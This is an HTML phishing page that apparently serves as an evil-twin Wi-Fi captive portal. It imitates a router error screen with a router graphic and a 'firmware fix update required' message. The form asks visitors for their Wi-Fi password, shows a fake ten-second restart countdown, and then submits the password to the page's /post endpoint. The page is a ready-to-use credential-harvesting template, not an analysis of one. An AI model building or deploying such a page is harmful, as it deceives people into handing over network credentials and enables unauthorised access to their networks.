<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Router Update</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #672f7f; /* Cinza mais escuro */
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            padding: 10px;
            box-sizing: border-box;
        }
        .container {
            background-color: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.2);
            text-align: center;
            max-width: 360px;
            width: 100%;
        }
        .container svg {
            width: 70px;
            height: 70px;
            fill: #672f7f; /* Cor de alerta */
            margin-bottom: 20px;
        }
        h1 {
            color: #672f7f;
            font-size: 22px;
            margin-bottom: 15px;
        }
        p {
            color: #672f7f;
            font-size: 15px;
            margin-bottom: 20px;
        }
        input[type="password"] {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border-radius: 5px;
            border: 1px solid #ccc;
            font-size: 16px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 12px;
            background-color: #672f7f;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            transition: background-color 0.3s;
        }
        button:hover {
            background-color: #421e52;
        }
        div#success-block{
            display: none;
            text-align: center;
            min-height: 60px;
            margin-bottom: 30px;
            justify-content: center;
            align-items: center;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Ícone No Signal em SVG -->
       <svg width="600" height="400" viewBox="0 0 600 400" xmlns="http://www.w3.org/2000/svg">
  <!-- ظل خفيف -->
  <ellipse cx="300" cy="375" rx="200" ry="15" fill="#000" opacity="0.15"/>

  <!-- جسم الراوتر الأسود -->
  <g>
    <rect x="100" y="80" width="400" height="260" rx="40" fill="#1A1A1A" stroke="#333" stroke-width="3"/>
    <!-- لمعة علوية -->
    <rect x="100" y="80" width="400" height="60" rx="40" fill="#2A2A2A" opacity="0.8"/>
    <rect x="100" y="110" width="400" height="30" fill="#2A2A2A"/>

    <!-- فتحات تهوية -->
    <g fill="#000" opacity="0.5">
      <rect x="180" y="100" width="40" height="6" rx="3"/>
      <rect x="230" y="100" width="40" height="6" rx="3"/>
      <rect x="280" y="100" width="40" height="6" rx="3"/>
      <rect x="330" y="100" width="40" height="6" rx="3"/>
      <rect x="380" y="100" width="40" height="6" rx="3"/>
    </g>
  </g>

  <!-- انتينا شمال -->
  <g>
    <rect x="55" y="70" width="18" height="220" rx="9" fill="#111" stroke="#444" stroke-width="2" transform="rotate(-12 64 180)"/>
    <circle cx="68" cy="290" r="14" fill="#2A2A2A" stroke="#444" stroke-width="2"/>
  </g>

  <!-- انتينا يمين -->
  <g>
    <rect x="527" y="70" width="18" height="220" rx="9" fill="#111" stroke="#444" stroke-width="2" transform="rotate(12 536 180)"/>
    <circle cx="532" cy="290" r="14" fill="#2A2A2A" stroke="#444" stroke-width="2"/>
  </g>

  <!-- لمبات -->
  <g>
    <circle cx="200" cy="310" r="5" fill="#333"/>
    <circle cx="250" cy="310" r="5" fill="#333"/>
    <circle cx="300" cy="310" r="5" fill="#FF3B30"/>
    <circle cx="350" cy="310" r="5" fill="#333"/>
    <circle cx="400" cy="310" r="5" fill="#333"/>
  </g>

  <!-- علامة الكروس الحمراء الكبيرة -->
  <g>
    <!-- خلفية بيضاء دائرية للكروس عشان تبان -->
    <circle cx="300" cy="200" r="75" fill="white" opacity="0.95"/>
    <!-- الـ X -->
    <g stroke="#FF0000" stroke-width="18" stroke-linecap="round">
      <line x1="260" y1="160" x2="340" y2="240"/>
      <line x1="340" y1="160" x2="260" y2="240"/>
    </g>
  </g>
</svg> </svg>
        <h1>We</h1>
        <h1>Router Error</h1>
        <div id='form-block'>
            <p>Router firmware fix update required. Enter your Wi-Fi password to update. ERROR 28476927F</p>
            <form id='submit-form' action="/post">
                <input type="password" name="password" placeholder="Wi-Fi network password" required>
                <button type="submit">Update</button>
            </form>
        </div>
        <div id='success-block'>
            <p>The router will restart in <span id="span-count" style="font-weight: bolder;">10</span></p>
        </div>
    </div>

    <script>
      document.getElementById('submit-form').addEventListener('submit', function(event) {
        event.preventDefault();

        document.getElementById('success-block').style.display = 'flex';
        document.getElementById('form-block').style.display = 'none';

        setInterval(function() {
            index = parseInt(document.getElementById('span-count').textContent)
            if (index > 1) {
                document.getElementById('span-count').textContent = index-1;
                index--;
            } else {
                document.getElementById('submit-form').submit();
            }
        }, 1000);
      });
    </script>
</body>
</html>
